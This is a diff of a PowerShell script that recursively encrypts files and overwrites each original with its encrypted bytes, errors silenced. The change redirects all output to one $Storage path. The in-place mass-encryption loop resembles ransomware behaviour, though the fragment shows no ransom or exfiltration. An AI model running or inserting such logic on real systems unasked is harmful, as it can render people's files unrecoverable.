@@ -44,7 +44,6 @@ Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyC
     ForEach-Object {
         # Calculate new path, preserving folder structure in the output folder 
         $relativePath = $_.FullName.Substring($FilesToEncrypt.Length)
-        $newFilePath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
         
         # Call the existing function Protect-AesFile on each object 
         try {
@@ -56,8 +55,8 @@ Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyC
 
 	    # (needed for decryption)
 	    $Final = $Salt + $IV + $OutBytes
-	    [System.IO.File]::WriteAllBytes($newFilePath, $Final)
-            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newFilePath))
+	    [System.IO.File]::WriteAllBytes($Storage, $Final)
+            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($Storage))
         }
         catch {
             Write-Warning "Unable to encrypt: $($_.FullName). Receiving error: $($_.Message)"
